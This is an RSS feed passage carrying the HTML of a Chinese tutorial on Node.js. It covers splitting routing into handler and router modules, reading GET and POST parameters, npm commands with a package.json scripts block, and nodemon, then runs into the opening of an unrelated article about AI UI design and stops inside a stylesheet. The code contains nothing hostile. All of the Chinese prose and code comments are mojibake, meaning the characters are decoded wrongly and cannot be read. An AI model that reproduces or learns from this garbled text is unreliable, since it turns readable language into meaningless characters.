            res.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
        } <span class="hljs-keyword">else</span> {
            res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">404</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/html'</span> });
            fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/404.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(res);
        }
    })
    server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
}
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    startServer
};
</code></pre>
<h2 data-id="heading-16">11.é‡æ„è·¯ç”±ä»£ç </h2>
<p>ä¸Šé¢è¿™ä¸ªè·¯ç”±è¿˜æ˜¯ç•¥å¾®ä¸å¥½,å¦‚æœæˆ‘ä»¬æœ‰ä¸€ç™¾ä¸ªæ¥å£,å…¨å†™åœ¨ server.js çš„è¯,ä¼šååˆ†çš„è‡ƒè‚¿å’Œéš¾ç»´æŠ¤,æ‰€ä»¥è¿›è¡Œä¸€ä¸ªé‡æ„çš„æ“ä½œ</p>
<p>æ–°å»ºhandler.jsæ–‡ä»¶,è¯¥æ–‡ä»¶ä¸“é—¨ <strong>å¤„ç†å…·ä½“çš„ä¸šåŠ¡é€»è¾‘å’Œç”Ÿæˆå“åº”å†…å®¹</strong></p>
<p>æ–°å»º route.jsæ–‡ä»¶,è¯¥æ–‡ä»¶è´Ÿè´£ <strong>URLè·¯ç”±çš„åˆ†å‘å’Œ404å¤„ç†</strong></p>
<p><strong>æ€è·¯è§£æ:</strong></p>
<p>æŠŠåŸå…ˆçš„æ–¹æ³•å•ç‹¬æ”¾åœ¨ä¸€ä¸ªæ¨¡å—,è§£æ„æ›´åŠ æ¸…æ™°,æ›´æ˜“ç»´æŠ¤</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// server.js</span>
<span class="hljs-keyword">if</span> (url === <span class="hljs-string">"/"</span>) {
            res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/html'</span> });
            fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/hzh.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(res);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url === <span class="hljs-string">"/data"</span>) {
            res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> });
            res.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
        } <span class="hljs-keyword">else</span> {
            res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">404</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/html'</span> });
            fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/404.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(res);
        }

<span class="hljs-comment">//å˜æˆ  </span>
<span class="hljs-comment">// handler.js</span>
<span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);

<span class="hljs-keyword">let</span> data = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./data.json'</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">hzh</span>(<span class="hljs-params">response</span>) {
    response.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/html'</span> });
    fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/hzh.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(response);
}


<span class="hljs-keyword">function</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">response</span>) {
    response.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> });
    response.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
};


<span class="hljs-keyword">function</span> <span class="hljs-title function_">list</span>(<span class="hljs-params">response</span>) {
    response.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> });
    <span class="hljs-keyword">let</span> lists = {
        <span class="hljs-string">"users"</span>: <span class="hljs-string">"yj"</span>
    };
    response.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(lists));
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    hzh,
    user,
    list
};
</code></pre>
<p>code.jså¯¼å…¥  handler æ–¹æ³•,åˆ›å»º handle å¯¹è±¡ æ¥å— handler ä¸­çš„å‡½æ•°,ç„¶åä½œä¸ºå‚æ•°ä¼ é€’ç»™ server.startServer æ–¹æ³•,æŠŠ  route å‡½æ•°ä¹Ÿä¼ é€’è¿‡å»</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//code.js</span>
<span class="hljs-keyword">const</span> server = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./server'</span>)
<span class="hljs-keyword">let</span> handler = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./handler'</span>);
<span class="hljs-keyword">let</span> { route } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./router.js'</span>);
<span class="hljs-comment">//ç”¨æ¥æ¥å— handler æ–¹æ³•</span>
<span class="hljs-keyword">let</span> handle = {}
<span class="hljs-comment">//èµ‹å€¼</span>
handle[<span class="hljs-string">"/"</span>] = handler.<span class="hljs-property">hzh</span>;
handle[<span class="hljs-string">"/data"</span>] = handler.<span class="hljs-property">user</span>;
handle[<span class="hljs-string">"/list"</span>] = handler.<span class="hljs-property">list</span>;
<span class="hljs-comment">//ä¼ é€’ route,handle ä¸¤ä¸ªå‚æ•°</span>
server.<span class="hljs-title function_">startServer</span>(route, handle);
</code></pre>
<p>server.js,è°ƒç”¨ route æ–¹æ³• ,å¹¶ä¼ é€’ä¸‰ä¸ªå‚æ•°,<strong>handle(è·¯ç”±é…ç½®è¡¨)</strong>ã€<strong>request(è¯·æ±‚ä¿¡æ¯)</strong> å’Œ <strong>res(å“åº”å·¥å…·)</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">startServer</span>(<span class="hljs-params">route, handle</span>) {
    <span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">request, res</span>) {
       <span class="hljs-comment">//è°ƒç”¨æ–¹æ³•,ä¼ é€’ä¸‰ä¸ªå‚æ•°ç»™routeæ–¹æ³•</span>
        <span class="hljs-title function_">route</span>(handle, request, res);
    })
    server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
}
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    startServer
};
</code></pre>
<p>router.js,æœ€ç»ˆåœ°ç‚¹è·¯ç”±è·³è½¬éƒ¨åˆ†</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">route</span>(<span class="hljs-params">handle, request, response</span>) {
    <span class="hljs-comment">//åˆ¤æ–­ handle[request.url] æ˜¯å¦åœ¨ handler ä¸­æœ‰ä¸€ä¸ªå‡½æ•°</span>
    <span class="hljs-comment">//è¿™ç‚¹éœ€è¦å›é¡¾ä¹‹å‰,éœ€è¦çŸ¥é“è¿™éƒ¨åˆ† handle["/"] = handler.hzh;è€Œå½“æˆ‘ä»¬çš„æµè§ˆå™¨åœ°å€ä¸º http://localhost:3000 æ—¶ request.url = "/"</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> handle[request.<span class="hljs-property">url</span>] === <span class="hljs-string">'function'</span>) {
        <span class="hljs-comment">//å¦‚æœæˆåŠŸ è¿›å…¥handler.hzhæ–¹æ³•ä¸­,ä¼ é€’responseå‚æ•°</span>
        handle[request.<span class="hljs-property">url</span>](response);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">//å¦‚æœhandlerä¸­æ²¡æœ‰è¿™ä¸ªå‡½æ•° åˆ™è·³è½¬è‡³404é¡µé¢</span>
        fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/404.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(response);
    }
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    route
}
</code></pre>
<p><strong>ä¼˜ç‚¹:</strong></p>
<ol>
<li><strong>èŒè´£åˆ†ç¦»</strong> - æ¯ä¸ªæ–‡ä»¶æœ‰æ˜ç¡®å•ä¸€çš„è´£ä»»</li>
<li><strong>æ˜“äºç»´æŠ¤</strong> - ä¿®æ”¹ä¸šåŠ¡é€»è¾‘åªéœ€æ”¹handler.jsï¼Œä¿®æ”¹è·¯ç”±åªéœ€æ”¹route.js</li>
<li><strong>å¯æ‰©å±•æ€§</strong> - æ·»åŠ æ–°è·¯ç”±åªéœ€åœ¨handler.jsæ·»åŠ å‡½æ•°ï¼Œåœ¨code.jsæ³¨å†Œå³å¯</li>
<li><strong>ä»£ç å¤ç”¨</strong> - è·¯ç”±é€»è¾‘å’Œä¸šåŠ¡é€»è¾‘å¯ä»¥ç‹¬ç«‹å¤ç”¨</li>
</ol>
<h2 data-id="heading-17">12.ä½¿ç”¨GETæˆ–POSTå‘é€æ•°æ®</h2>
<p>ä»€ä¹ˆæ˜¯ <strong>GET</strong>å’Œ <strong>POST</strong>?</p>
<p><strong>GET çš„è¯·æ±‚ç›®çš„æ˜¯ä»æœåŠ¡å™¨è·å–èµ„æºï¼Œè¿™ä¸ªè¯·æ±‚æœ¬èº«ä¸åº”å¯¹æœåŠ¡å™¨æ•°æ®äº§ç”Ÿä»»ä½•å‰¯ä½œç”¨ã€‚</strong></p>
<p><strong>POST çš„è¯·æ±‚ç›®çš„æ˜¯å‘æœåŠ¡å™¨æäº¤æ•°æ®ï¼Œå¹¶æœŸæœ›æœåŠ¡å™¨æ ¹æ®è¿™äº›æ•°æ®æ‰§è¡Œç›¸åº”çš„å¤„ç†ï¼ˆå¦‚åˆ›å»ºã€æ›´æ–°èµ„æºï¼Œæˆ–æ‰§è¡Œä¸€ä¸ªä¼šäº§ç”Ÿå‰¯ä½œç”¨çš„æŸ¥è¯¢ï¼‰</strong></p>
<p>å›é¡¾ä¹‹å‰çš„ä»£ç ,æˆ‘ä»¬ä¼¼ä¹æ²¡æœ‰åšgetæˆ–è€…postè¯·æ±‚,ç„¶å¹¶éå¦‚æ­¤,ä½†æˆ‘ä»¬æ²¡æœ‰å†™è¯·æ±‚çš„æ—¶å€™,<strong>é»˜è®¤</strong>æ˜¯ get è¯·æ±‚çš„,ä¸‹é¢æ˜¯postè¯·æ±‚å¦‚ä½•å»å†™</p>
<p>hzh.html</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    è·³è½¬è‡³/listé¡µé¢ å‘é€ post è¯·æ±‚
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/list"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span>&gt;</span>
        name <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"name"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
        password <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"submit"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//server.js</span>
<span class="hljs-keyword">let</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);
<span class="hljs-keyword">let</span> url = <span class="hljs-built_in">require</span>(<span class="hljs-string">"url"</span>);
<span class="hljs-keyword">let</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">"querystring"</span>);
<span class="hljs-keyword">function</span> <span class="hljs-title function_">startServer</span>(<span class="hljs-params">route, handle</span>) {
    <span class="hljs-keyword">let</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">request, res</span>) {
        <span class="hljs-keyword">let</span> pathname = url.<span class="hljs-title function_">parse</span>(request.<span class="hljs-property">url</span>).<span class="hljs-property">pathname</span>;
        <span class="hljs-keyword">let</span> data = []
        request.<span class="hljs-title function_">on</span>(<span class="hljs-string">'error'</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
            <span class="hljs-comment">//æ‰“å°é”™è¯¯ä¿¡æ¯</span>
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err);
            <span class="hljs-comment">//å½“æœ‰æ•°æ®åˆ°è¾¾æœåŠ¡å™¨æ—¶ï¼Œdata äº‹ä»¶ä¼šè¢«è§¦å‘</span>
        }).<span class="hljs-title function_">on</span>(<span class="hljs-string">'data'</span>, <span class="hljs-function">(<span class="hljs-params">chunk</span>) =&gt;</span> {
            <span class="hljs-comment">//æ¥æ”¶æ•°æ®</span>
            data.<span class="hljs-title function_">push</span>(chunk)
        }).<span class="hljs-title function_">on</span>(<span class="hljs-string">'end'</span>, <span class="hljs-function">() =&gt;</span> {
            <span class="hljs-keyword">if</span> (request.<span class="hljs-property">method</span> === <span class="hljs-string">'POST'</span>) {
                <span class="hljs-comment">//æŠŠå†…å®¹è½¬åŒ–æˆå­—ç¬¦ä¸²  </span>
                <span class="hljs-keyword">let</span> postData = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">concat</span>(data).<span class="hljs-title function_">toString</span>();
                <span class="hljs-comment">//querystring.parseæŠŠ å­—ç¬¦ä¸² è½¬åŒ–æˆ å¯¹è±¡ å½¢å¼</span>
                <span class="hljs-title function_">route</span>(handle, pathname, res, querystring.<span class="hljs-title function_">parse</span>(postData));
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">//è·å–getè¯·æ±‚åé¢çš„å‚æ•° /list?name=abc&amp;age=18 params å°±æ˜¯ { name: 'abc', age: '18' }</span>
                <span class="hljs-keyword">let</span> params = url.<span class="hljs-title function_">parse</span>(request.<span class="hljs-property">url</span>, <span class="hljs-literal">true</span>).<span class="hljs-property">query</span>;
                <span class="hljs-title function_">route</span>(handle, pathname, res, params);
            }
        })


    })
    server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"server is running at http://localhost:3000"</span>);
}
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    startServer
};


</code></pre>
<p>handler.js ä¸­ list å‡½æ•°</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//handler.js æ¥å—paramså‚æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">list</span>(<span class="hljs-params">response, params</span>) {
    response.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> });
    response.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(params));
}
</code></pre>
<p>router.js</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-comment">//æ–°å¢ params </span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">route</span>(<span class="hljs-params">handle, request, response, params</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> handle[request] === <span class="hljs-string">'function'</span>) {
        <span class="hljs-comment">//ä¼ é€’paramså‚æ•°</span>
        handle[request](response, params);
    } <span class="hljs-keyword">else</span> {
        fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/404.html"</span>, <span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">pipe</span>(response);
    }
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    route
}
</code></pre>
<h2 data-id="heading-18">13.npmå‘½ä»¤</h2>
<h3 data-id="heading-19">å®‰è£…ä¾èµ–</h3>
<p>å½“æˆ‘ä»¬éœ€è¦ç¬¬ä¸‰æ–¹çš„ä¾èµ–æ—¶,å¯ä»¥é€šè¿‡npmè¿›è¡Œä¸‹è½½</p>
<pre><code class="hljs">npm install express
</code></pre>
<h3 data-id="heading-20">cnpmé•œåƒ</h3>
<p>npmæ˜¯åœ¨è¿œç¨‹ä»“åº“ä¸‹è½½ï¼Œæˆ‘ä»¬çŸ¥é“ä»–çš„ä»“åº“å¹¶ä¸åœ¨å›½å†…ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå›½å†…çš„ä»“åº“é•œåƒ</p>
<pre><code class="hljs language-ini" lang="ini">npm install -g cnpm <span class="hljs-attr">--registry</span>=http://registry.npm.taobao.org
</code></pre>
<h3 data-id="heading-21">package.json</h3>
<p>å› ä¸ºnode_modulesæ–‡ä»¶ä¾èµ–æ–‡ä»¶å¤ªå¤šï¼Œè€Œä¸”ä»–ä¹Ÿä¸å±äºæˆ‘ä»¬çš„æºä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä¸Šä¼ æºä»£ç çš„æ—¶å€™å¹¶ä¸ä¼šä¸Šä¼ è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œé‚£ä¹ˆåˆ«äººå¦‚ä½•çŸ¥é“æˆ‘ä»¬å®‰è£…è¿‡äº†å“ªäº›åŒ…å‘¢ï¼Ÿ</p>
<pre><code class="hljs language-csharp" lang="csharp">npm <span class="hljs-keyword">init</span>
</code></pre>
<p>å®‰è£…ä¾èµ–æ—¶,æˆ‘ä»¬å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸ŠåŠ å…¥ <strong>--save</strong> æˆ– <strong>--sage-dev</strong></p>
<pre><code class="hljs language-css" lang="css">npm install <span class="hljs-attr">--save</span> express
npm install <span class="hljs-attr">--save-dev</span> express
</code></pre>
<p>ä¸Šè¿°ä¸¤ç§æ–¹æ³•,åŒºåˆ«åœ¨ <strong>--save</strong> æ˜¯ç”Ÿäº§ç¯å¢ƒ , <strong>--save-dev</strong> æ˜¯å¼€å‘ç¯å¢ƒ</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"express"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.2.1"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"gulp"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"5.0.1"</span>
  <span class="hljs-punctuation">}</span>
</code></pre>
<p>æœ‰äº†ä¸Šè¿°æè¿°,æˆ‘ä»¬åˆ é™¤node_modulesåˆ«äººå¯ä»¥ä½¿ç”¨ä¸‹è¿°å‘½ä»¤ç›´æ¥ä¸‹è½½æˆ‘ä»¬ä¹‹å‰çš„ä¾èµ–åŒ…</p>
<pre><code class="hljs">npm install
</code></pre>
<h3 data-id="heading-22">scriptsè„šæœ¬</h3>
<p>æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªscriptsè„šæœ¬å¯ä»¥ä½¿ç”¨ï¼Œä¸€ä¸ªé¡¹ç›®çš„å…¥å£æ–‡ä»¶ä¸æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥å¦‚æœåˆ«äººæ‹¿åˆ°ä½ çš„ä»£ç ï¼Œä¸çŸ¥é“ä½ çš„å…¥å£æ–‡ä»¶ï¼Œåˆ™æ— æ³•è¿è¡Œä½ çš„é¡¹ç›®ï¼Œä¸‹é¢çš„è„šæœ¬å¯ä»¥æœ‰æ•ˆçš„è§£å†³è¿™ä¸ªé—®é¢˜</p>
<pre><code class="hljs language-json" lang="json"> <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"test"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"start"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node code.js"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
</code></pre>
<h2 data-id="heading-23">14.nodemon</h2>
<p>nodemonæ˜¯ä¸€ç§å·¥å…·ï¼Œå¯ä»¥è‡ªåŠ¨æ£€æµ‹åˆ°ç›®å½•ä¸­çš„æ–‡ä»¶æ›´æ”¹æ—¶é€šè¿‡é‡æ–°å¯åŠ¨åº”ç”¨ç¨‹åºæ¥è°ƒè¯•åŸºäºnode.jsçš„åº”ç”¨ç¨‹åºã€‚</p>
<pre><code class="hljs">npm install -g nodemon
</code></pre>
<p>æœ‰äº†è¿™ä¸ªå‘½ä»¤ï¼Œæˆ‘ä»¬å°±ä¸å†éœ€è¦æ¯æ¬¡ä¿®æ”¹å®Œæ¯•ä»£ç è¿›è¡Œé‡å¯äº†ï¼Œä»–å¯ä»¥æ£€æµ‹æ–‡ä»¶çš„æ”¹å˜è€Œè‡ªåŠ¨é‡å¯</p>
<pre><code class="hljs">nodemon app.js
</code></pre>
<p>å½“ç„¶ã€‚nodemonä¸ä»…æœ‰ä»¥ä¸ŠåŠŸèƒ½ï¼Œä»–è¿˜æœ‰å¾ˆå¤šé…ç½®ï¼Œä½†æ˜¯å¯¹äºç›®å‰æˆ‘ä»¬çš„éœ€æ±‚æ¥è¯´ä¸å¤ªéœ€è¦ï¼Œåœ¨è¿™é‡Œä¸åšå™è¿°</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI å†™ UI å¤ªä¸‘ï¼Ÿè¿™ä¸ªskillsè®©å®ƒç§’å˜è®¾è®¡ä¸“å®¶]]></title>    <link>https://juejin.cn/post/7602466689712046095</link>    <guid>https://juejin.cn/post/7602466689712046095</guid>    <pubDate>2026-02-03T13:00:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602466689712046095" data-draft-id="7602472997920440320" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI å†™ UI å¤ªä¸‘ï¼Ÿè¿™ä¸ªskillsè®©å®ƒç§’å˜è®¾è®¡ä¸“å®¶"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-03T13:00:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aZheçš„å…¨æ ˆçŸ¥è¯†åˆ†äº«"/> <meta itemprop="url" content="https://juejin.cn/user/1039471959105228"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI å†™ UI å¤ªä¸‘ï¼Ÿè¿™ä¸ªskillsè®©å®ƒç§’å˜è®¾è®¡ä¸“å®¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1039471959105228/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aZheçš„å…¨æ ˆçŸ¥è¯†åˆ†äº«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:00:15.000Z" title="Tue Feb 03 2026 13:00:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 